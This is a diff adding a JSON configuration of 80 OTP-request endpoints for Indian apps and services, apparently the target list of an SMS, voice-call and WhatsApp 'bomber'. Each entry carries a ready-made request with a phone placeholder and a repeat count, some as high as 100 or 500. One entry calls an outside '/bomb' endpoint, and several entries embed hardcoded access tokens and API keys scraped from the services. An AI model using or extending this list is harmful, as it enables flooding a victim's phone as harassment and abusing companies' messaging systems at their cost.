@@ -1,0 +1,1194 @@
+{
+  "apis": [
+    {
+      "id": 1,
+      "name": "Tata Capital Voice Call",
+      "type": "Call",
+      "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      },
+      "body": {
+        "phone": "{phone}",
+        "isOtpViaCallAtLogin": "true"
+      },
+      "count": 5
+    },
+    {
+      "id": 2,
+      "name": "1MG Voice Call",
+      "type": "Call",
+      "url": "https://www.1mg.com/auth_api/v6/create_token",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "number": "{phone}",
+        "otp_on_call": true
+      },
+      "count": 5
+    },
+    {
+      "id": 3,
+      "name": "Swiggy Call Verification",
+      "type": "Call",
+      "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "mobile": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 4,
+      "name": "Flipkart Voice Call",
+      "type": "Call",
+      "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "mobile": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 5,
+      "name": "Zivame Voice Call",
+      "type": "Call",
+      "url": "https://api.zivame.com/v2/customer/login/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": "{phone}",
+        "otp_type": "voice"
+      },
+      "count": 5
+    },
+    {
+      "id": 6,
+      "name": "Lenskart SMS",
+      "type": "SMS",
+      "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phoneCode": "+91",
+        "telephone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 7,
+      "name": "PharmEasy SMS",
+      "type": "SMS",
+      "url": "https://pharmeasy.in/api/v2/auth/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 8,
+      "name": "Snitch SMS",
+      "type": "SMS",
+      "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile_number": "+91{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 9,
+      "name": "ShipRocket SMS",
+      "type": "SMS",
+      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobileNumber": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 10,
+      "name": "GoKwik SMS",
+      "type": "SMS",
+      "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "country": "in"
+      },
+      "count": 5
+    },
+    {
+      "id": 11,
+      "name": "KPN WhatsApp",
+      "type": "WhatsApp",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "notification_channel": "WHATSAPP",
+        "phone_number": {
+          "country_code": "+91",
+          "number": "{phone}"
+        }
+      },
+      "count": 5
+    },
+    {
+      "id": 12,
+      "name": "Rappi WhatsApp",
+      "type": "WhatsApp",
+      "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "country_code": "+91",
+        "phone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 13,
+      "name": "Wakefit SMS",
+      "type": "SMS",
+      "url": "https://api.wakefit.co/api/consumer-sms-otp/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 14,
+      "name": "Hungama OTP",
+      "type": "SMS",
+      "url": "https://communication.api.hungama.com/v1/communication/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobileNo": "{phone}",
+        "countryCode": "+91",
+        "appCode": "un",
+        "messageId": "1",
+        "device": "web"
+      },
+      "count": 5
+    },
+    {
+      "id": 15,
+      "name": "Doubtnut SMS",
+      "type": "SMS",
+      "url": "https://api.doubtnut.com/v4/student/login",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": "{phone}",
+        "language": "en"
+      },
+      "count": 5
+    },
+    {
+      "id": 16,
+      "name": "PenPencil SMS",
+      "type": "SMS",
+      "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "organizationId": "5eb393ee95fab7468a79d189",
+        "mobile": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 17,
+      "name": "BeepKart SMS",
+      "type": "SMS",
+      "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "city": 362
+      },
+      "count": 5
+    },
+    {
+      "id": 18,
+      "name": "Smytten SMS",
+      "type": "SMS",
+      "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "email": "test@example.com"
+      },
+      "count": 5
+    },
+    {
+      "id": 19,
+      "name": "Housing.com SMS",
+      "type": "SMS",
+      "url": "https://login.housing.com/api/v2/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "country_url_name": "in"
+      },
+      "count": 5
+    },
+    {
+      "id": 20,
+      "name": "RentoMojo SMS",
+      "type": "SMS",
+      "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 21,
+      "name": "Khatabook SMS",
+      "type": "SMS",
+      "url": "https://api.khatabook.com/v1/auth/request-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "app_signature": "wk+avHrHZf2"
+      },
+      "count": 5
+    },
+    {
+      "id": 22,
+      "name": "Animall SMS",
+      "type": "SMS",
+      "url": "https://animall.in/zap/auth/login",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "signupPlatform": "NATIVE_ANDROID"
+      },
+      "count": 5
+    },
+    {
+      "id": 23,
+      "name": "Cosmofeed SMS",
+      "type": "SMS",
+      "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "version": "1.4.28"
+      },
+      "count": 5
+    },
+    {
+      "id": 24,
+      "name": "Spencer's SMS",
+      "type": "SMS",
+      "url": "https://jiffy.spencers.in/user/auth/otp/send",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 25,
+      "name": "Shopper's Stop SMS",
+      "type": "SMS",
+      "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "type": "SIGNIN_WITH_MOBILE"
+      },
+      "count": 5
+    },
+    {
+      "id": 26,
+      "name": "PokerBaazi SMS",
+      "type": "SMS",
+      "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "mfa_channels": "phno"
+      },
+      "count": 5
+    },
+    {
+      "id": 27,
+      "name": "My11Circle SMS",
+      "type": "SMS",
+      "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "mfa_channels": "phno"
+      },
+      "count": 5
+    },
+    {
+      "id": 28,
+      "name": "RummyCircle SMS",
+      "type": "SMS",
+      "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "isPlaycircle": false
+      },
+      "count": 5
+    },
+    {
+      "id": 29,
+      "name": "Splexxo API",
+      "type": "SMS",
+      "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
+      "method": "GET",
+      "headers": {},
+      "body": null,
+      "count": 100
+    },
+    {
+      "id": 30,
+      "name": "DeHaat SMS",
+      "type": "SMS",
+      "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile_number": "{phone}",
+        "client_id": "kisan-app"
+      },
+      "count": 10
+    },
+    {
+      "id": 31,
+      "name": "Breeze SMS",
+      "type": "SMS",
+      "url": "https://api.breeze.in/session/start",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-device-id": "A1pKVEDhlv66KLtoYsml3",
+        "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
+      },
+      "body": {
+        "phoneNumber": "{phone}",
+        "authVerificationType": "otp",
+        "device": {
+          "id": "A1pKVEDhlv66KLtoYsml3",
+          "platform": "Chrome",
+          "type": "Desktop"
+        },
+        "countryCode": "+91"
+      },
+      "count": 10
+    },
+    {
+      "id": 32,
+      "name": "Jockey WhatsApp",
+      "type": "WhatsApp",
+      "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
+      "method": "GET",
+      "headers": {
+        "User-Agent": "Mozilla/5.0",
+        "Origin": "https://www.jockey.in"
+      },
+      "body": null,
+      "count": 10
+    },
+    {
+      "id": 33,
+      "name": "PW Live SMS",
+      "type": "SMS",
+      "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "countryCode": "+91",
+        "subOrgId": "SUB-PWLI000"
+      },
+      "count": 5
+    },
+    {
+      "id": 34,
+      "name": "Zoho SMS",
+      "type": "SMS",
+      "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN",
+      "method": "POST",
+      "headers": {
+        "Origin": "https://www.zoho.com"
+      },
+      "body": null,
+      "count": 500
+    },
+    {
+      "id": 35,
+      "name": "KPN Fresh SMS",
+      "type": "SMS",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
+      "method": "POST",
+      "headers": {
+        "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": {
+          "country_code": "+91",
+          "number": "{phone}"
+        }
+      },
+      "count": 20
+    },
+    {
+      "id": 36,
+      "name": "Aditya Birla SMS",
+      "type": "SMS",
+      "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "MobileNumber={phone}&functionality=signup",
+      "count": 1
+    },
+    {
+      "id": 37,
+      "name": "Muthoot Finance SMS",
+      "type": "SMS",
+      "url": "https://www.muthootfinance.com/smsapi.php",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&pin=XjtYYEdhP0haXjo3",
+      "count": 3
+    },
+    {
+      "id": 38,
+      "name": "GoPaySense SMS",
+      "type": "SMS",
+      "url": "https://api.gopaysense.com/users/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 39,
+      "name": "IIFL SMS",
+      "type": "SMS",
+      "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile_number={phone}&full_name=Test+User",
+      "count": 5
+    },
+    {
+      "id": 40,
+      "name": "BankOpen SMS",
+      "type": "SMS",
+      "url": "https://v2-api.bankopen.co/users/register/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "username": "{phone}",
+        "is_open_capital": 1
+      },
+      "count": 5
+    },
+    {
+      "id": 41,
+      "name": "Tata Capital SMS",
+      "type": "SMS",
+      "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "header": {
+          "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
+          "identifier": "nli"
+        },
+        "body": {
+          "mobileNumber": "{phone}"
+        }
+      },
+      "count": 40
+    },
+    {
+      "id": 42,
+      "name": "TradeIndia SMS",
+      "type": "SMS",
+      "url": "https://apis.tradeindia.com/app_login_api/login_app",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "+91{phone}"
+      },
+      "count": 3
+    },
+    {
+      "id": 43,
+      "name": "Orange Health SMS",
+      "type": "SMS",
+      "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile_number": "{phone}",
+        "customer_auto_fetch_message": true
+      },
+      "count": 3
+    },
+    {
+      "id": 44,
+      "name": "Jobhai SMS",
+      "type": "SMS",
+      "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 45,
+      "name": "Mvaahna SMS",
+      "type": "SMS",
+      "url": "https://mconnect.isteer.co/mconnect/login",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile_number": "+91{phone}"
+      },
+      "count": 50
+    },
+    {
+      "id": 46,
+      "name": "Astrosage SMS",
+      "type": "SMS",
+      "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&_=1719472121119",
+      "method": "GET",
+      "headers": {},
+      "body": null,
+      "count": 3
+    },
+    {
+      "id": 47,
+      "name": "Spinny SMS",
+      "type": "SMS",
+      "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "contact_number": "{phone}",
+        "whatsapp": false,
+        "code_len": 4,
+        "expected_action": "login"
+      },
+      "count": 3
+    },
+    {
+      "id": 48,
+      "name": "Dream11 SMS",
+      "type": "SMS",
+      "url": "https://www.dream11.com/auth/passwordless/init",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "channel": "sms",
+        "flow": "SIGNUP",
+        "phoneNumber": "{phone}"
+      },
+      "count": 1
+    },
+    {
+      "id": 49,
+      "name": "CityMall SMS",
+      "type": "SMS",
+      "url": "https://citymall.live/api/cl-user/auth/get-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": "{phone}"
+      },
+      "count": 5
+    },
+    {
+      "id": 50,
+      "name": "BellaVita SMS",
+      "type": "SMS",
+      "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
+      "method": "GET",
+      "headers": {},
+      "body": null,
+      "count": 10
+    },
+    {
+      "id": 51,
+      "name": "Oyo Rooms SMS",
+      "type": "SMS",
+      "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "country_code": "+91",
+        "nod": 4
+      },
+      "count": 2
+    },
+    {
+      "id": 52,
+      "name": "Myma SMS",
+      "type": "SMS",
+      "url": "https://portal.myma.in/custom-api/auth/generateotp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "countrycode": "+91",
+        "mobile": "91{phone}",
+        "is_otpgenerated": false,
+        "app_version": "-1"
+      },
+      "count": 6
+    },
+    {
+      "id": 53,
+      "name": "Freedo SMS",
+      "type": "SMS",
+      "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "email_id": "test@example.com",
+        "first_name": "User",
+        "mobile_number": "{phone}"
+      },
+      "count": 6
+    },
+    {
+      "id": 54,
+      "name": "Licious SMS",
+      "type": "SMS",
+      "url": "https://www.licious.in/api/login/signup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}",
+        "captcha_token": null
+      },
+      "count": 3
+    },
+    {
+      "id": 55,
+      "name": "Bisleri SMS",
+      "type": "SMS",
+      "url": "https://apis.bisleri.com/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
+      },
+      "body": {
+        "email": "test@example.com",
+        "mobile": "{phone}"
+      },
+      "count": 20
+    },
+    {
+      "id": 56,
+      "name": "Evital SMS",
+      "type": "SMS",
+      "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "pharmacy_name": "Test Pharmacy",
+        "mobile": "{phone}",
+        "referral_code": "",
+        "email_id": "test@example.com",
+        "zip_code": "110086"
+      },
+      "count": 3
+    },
+    {
+      "id": 57,
+      "name": "QuickRide SMS",
+      "type": "SMS",
+      "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
+      "method": "POST",
+      "headers": {
+        "APP-TOKEN": "s16-q9fz-jy3p-rk",
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride",
+      "count": 5
+    },
+    {
+      "id": 58,
+      "name": "Clovia SMS",
+      "type": "SMS",
+      "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&is_otp=True",
+      "method": "GET",
+      "headers": {},
+      "body": null,
+      "count": 5
+    },
+    {
+      "id": 59,
+      "name": "KwikFix SMS",
+      "type": "SMS",
+      "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 3
+    },
+    {
+      "id": 60,
+      "name": "BreviStay SMS",
+      "type": "SMS",
+      "url": "https://www.brevistay.com/cst/app-api/login",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "brevi-channel": "DESKTOP_WEB"
+      },
+      "body": {
+        "is_otp": 1,
+        "is_password": 0,
+        "mobile": "{phone}"
+      },
+      "count": 15
+    },
+    {
+      "id": 61,
+      "name": "HourlyRooms SMS",
+      "type": "SMS",
+      "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "platform": "web-2.0.0"
+      },
+      "body": {
+        "phone": "{phone}"
+      },
+      "count": 1
+    },
+    {
+      "id": 62,
+      "name": "MadrasMandi SMS",
+      "type": "SMS",
+      "url": "https://api.madrasmandi.in/api/v1/auth/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "multipart/form-data"
+      },
+      "body": "phone=%2B91{phone}&scope=client",
+      "count": 3
+    },
+    {
+      "id": 63,
+      "name": "BharatLoan SMS",
+      "type": "SMS",
+      "url": "https://www.bharatloan.com/login-sbm",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "mobile={phone}&current_page=login&is_existing_customer=2",
+      "count": 50
+    },
+    {
+      "id": 64,
+      "name": "Pagarbook SMS",
+      "type": "SMS",
+      "url": "https://api.pagarbook.com/api/v5/auth/otp/request",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "userrole": "EMPLOYER"
+      },
+      "body": {
+        "phone": "{phone}",
+        "language": 1
+      },
+      "count": 5
+    },
+    {
+      "id": 65,
+      "name": "Vahak SMS",
+      "type": "SMS",
+      "url": "https://api.vahak.in/v1/u/o_w",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": "{phone}",
+        "scope": 0,
+        "is_whatsapp": false
+      },
+      "count": 1
+    },
+    {
+      "id": 66,
+      "name": "Redcliffe SMS",
+      "type": "SMS",
+      "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone_number": "{phone}",
+        "short": true
+      },
+      "count": 1
+    },
+    {
+      "id": 67,
+      "name": "Ixigo SMS",
+      "type": "SMS",
+      "url": "https://www.ixigo.com/api/v5/oauth/dual/mobile/send-otp",
+      "method": "POST",
+      "headers": {
+        "apikey": "ixiweb\u00212$",
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "sixDigitOTP=true&prefix=%2B91&phone={phone}",
+      "count": 1
+    },
+    {
+      "id": 68,
+      "name": "55Club SMS",
+      "type": "SMS",
+      "url": "https://api.55clubapi.com/api/webapi/SmsVerifyCode",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "phone": "91{phone}",
+        "codeType": 1,
+        "language": 0
+      },
+      "count": 1
+    },
+    {
+      "id": 69,
+      "name": "Zerodha SMS",
+      "type": "SMS",
+      "url": "https://zerodha.com/account/registration.php",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "source": "zerodha",
+        "partner_id": ""
+      },
+      "count": 100
+    },
+    {
+      "id": 70,
+      "name": "Aakash SMS",
+      "type": "SMS",
+      "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763"
+      },
+      "body": {
+        "mobile_psid": "{phone}",
+        "activity_type": "aakash-myadmission"
+      },
+      "count": 100
+    },
+    {
+      "id": 71,
+      "name": "Testbook SMS",
+      "type": "SMS",
+      "url": "https://api.testbook.com/api/v2/mobile/signup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}"
+      },
+      "count": 1
+    },
+    {
+      "id": 72,
+      "name": "MediBuddy SMS",
+      "type": "SMS",
+      "url": "https://loginprod.medibuddy.in/unified-login/user/register",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "source": "medibuddyInWeb",
+        "platform": "medibuddy",
+        "phonenumber": "{phone}",
+        "flow": "Retail-Login-Home-Flow"
+      },
+      "count": 50
+    },
+    {
+      "id": 73,
+      "name": "Beyoung SMS",
+      "type": "SMS",
+      "url": "https://www.beyoung.in/api/sendOtp.json",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "access-token": "JQ0fUq6r6dhzJHRLSdn3J6kyzNXumrEM9gy+q8456XEsQISIKfb31Wiyx/VhM84NYcBLGRVjXeU4GqYWDAJpwQ=="
+      },
+      "body": {
+        "username": "{phone}",
+        "username_type": "mobile",
+        "service_type": 0
+      },
+      "count": 100
+    },
+    {
+      "id": 74,
+      "name": "Wrogn SMS",
+      "type": "SMS",
+      "url": "https://omqkhavcch.execute-api.ap-south-1.amazonaws.com/simplyotplogin/v5/otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "shop_name": "wrogn-website.myshopify.com"
+      },
+      "body": {
+        "username": "+91{phone}",
+        "type": "mobile",
+        "domain": "wrogn.com"
+      },
+      "count": 5
+    },
+    {
+      "id": 75,
+      "name": "Medkart SMS",
+      "type": "SMS",
+      "url": "https://app.medkart.in/api/v1/auth/requestOTP",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "app-platform": "web"
+      },
+      "body": {
+        "mobile_no": "{phone}"
+      },
+      "count": 1
+    },
+    {
+      "id": 76,
+      "name": "MamaEarth SMS",
+      "type": "SMS",
+      "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "body": {
+        "mobile": "{phone}",
+        "referralCode": ""
+      },
+      "count": 10
+    },
+    {
+      "id": 77,
+      "name": "Coverfox SMS",
+      "type": "SMS",
+      "url": "https://www.coverfox.com/otp/send/",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "contact={phone}",
+      "count": 5
+    },
+    {
+      "id": 78,
+      "name": "WoodenStreet SMS",
+      "type": "SMS",
+      "url": "https://www.woodenstreet.com/index.php?route=account/forgotten_popup",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "body": "firstname=User&telephone={phone}&pincode=110086&city=DELHI&state=DELHI&email=test@example.com",
+      "count": 5
+    },
+    {
+      "id": 79,
+      "name": "GoMechanic SMS",
+      "type": "SMS",
+      "url": "https://gomechanic.app/api/v2/send_otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "Authorization": "725ea1b774c3558a8ec01a8405334a6e50e1e822d9549d84b36a1d3bb9478a27"
+      },
+      "body": {
+        "number": "{phone}",
+        "source": "website",
+        "random_id": "K6z9b"
+      },
+      "count": 50
+    },
+    {
+      "id": 80,
+      "name": "LoveLocal SMS",
+      "type": "SMS",
+      "url": "https://homedeliverybackend.mpaani.com/auth/send-otp",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "client-code": "vulpix"
+      },
+      "body": {
+        "phone_number": "{phone}",
+        "role": "CUSTOMER"
+      },
+      "count": 50
+    }
+  ]
+}
